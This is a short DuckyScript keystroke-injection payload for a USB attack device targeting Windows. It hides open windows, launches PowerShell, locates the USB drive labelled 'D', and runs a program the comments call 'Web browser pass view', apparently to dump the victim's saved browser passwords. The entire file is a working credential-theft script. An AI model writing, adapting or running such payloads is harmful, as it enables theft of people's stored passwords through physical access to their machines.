REM Close all open windows
DELAY 5000
GUI D
REM Start up power-shell
DELAY 100
GUI R
DELAY 100
STRING POWERSHELL
DELAY 50
ENTER
DELAY 500
REM Find and change directory to USB
STRING $usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'D' } | select name
DELAY 100
ENTER
STRING cd $usbPath.name
DELAY 100
ENTER
REM start Web browser pass view
STRING ./p
DELAY 200
ENTER
